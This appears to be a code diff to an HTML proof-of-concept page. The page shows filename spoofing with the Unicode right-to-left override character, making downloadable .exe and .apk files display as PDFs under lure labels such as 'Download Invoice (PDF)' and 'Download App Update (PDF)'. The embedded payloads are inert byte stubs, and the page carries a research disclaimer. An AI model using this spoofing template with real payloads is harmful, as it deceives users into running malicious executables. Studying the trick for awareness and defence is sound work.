@@ -4,8 +4,10 @@
     <meta charset="UTF-8">
     <title>Filename Spoofing PoC</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; line-height: 1.6; }
         .download-btn {
+            display: inline-block;
+            margin: 10px;
             padding: 15px 25px;
             background-color: #007bff;
             color: white;
@@ -13,29 +15,38 @@
             border-radius: 5px;
             font-weight: bold;
         }
+        .warning { margin-top: 30px; color: red; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <h2>Filename Spoofing via RLO (U+202E)</h2>
-    <p>নিচের লিঙ্কে ক্লিক করলে ফাইলটি <b>Invoice_2024exe.pdf</b> নামে ডাউনলোড হওয়ার কথা (visually),<br> 
-    কিন্তু আসলে এটি একটি <b>.exe</b> ফাইল হিসেবে সেভ হবে।</p>
+    <p>
+        Clicking the links below will visually appear to download a <b>.pdf</b> file,<br> 
+        but they are actually <b>.exe</b> and <b>.apk</b> files.
+    </p>
 
-    <br><br>
+    <br>
 
-    <!-- 
-        ব্যাখ্যা: 
-        &#x202E; হলো RLO ক্যারেক্টার। 
-        এটি 'fdp.exe' কে উল্টে দিয়ে 'exe.pdf' হিসেবে দেখাবে। 
-    -->
+    <!-- Example 1: .exe spoofed as .pdf -->
     <a href="data:application/octet-stream;base64,TVpQAA==" 
        download="Invoice_2024&#x202E;fdp.exe" 
        class="download-btn">
        Download Invoice (PDF)
     </a>
 
-    <p style="margin-top: 30px; color: red;">
-        সতর্কতা: এটি শুধুমাত্র গবেষণার উদ্দেশ্যে। কোনো সিস্টেমে ক্ষতি করার জন্য এটি ব্যবহার করবেন না।
+    <br>
+
+    <!-- Example 2: .apk spoofed as .pdf -->
+    <!-- Note: 'fdp.kpa' reversed becomes 'apk.pdf' -->
+    <a href="data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAAAAIQAAAAA=" 
+       download="Software_Update&#x202E;fdp.kpa" 
+       class="download-btn">
+       Download App Update (PDF)
+    </a>
+
+    <p class="warning">
+        DISCLAIMER: This is for educational and research purposes only. Do not use it for malicious activities.
     </p>
 
 </body>
